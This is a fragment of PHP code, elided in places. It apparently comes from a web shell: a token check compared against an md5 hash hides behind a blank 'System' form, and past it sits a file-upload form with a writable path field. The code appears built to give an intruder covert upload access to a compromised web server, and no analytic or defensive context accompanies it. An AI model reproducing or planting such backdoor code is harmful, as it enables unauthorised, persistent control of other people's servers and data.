...
$pa = md5($data[$uk] . $ba);
if ($pa !== $token) {
    echo "<title>System</title><form method='post'><input style='border: 0;' placeholder='Wait...' name='{$uk}' ><button> >> </button></form>";
    die();
}
...
<form id="m" method="post" enctype="multipart/form-data">' . $ss .
    '<input type="file" id="f" name="file" onchange="sf(1)"><br>
<input name="path" id="p" value="' . $data['path'] . '"><br>
...
<button style="display: none;" id="sb"></button></form><script>function sf(o){
if(o)m.enctype="multipart/form-data";
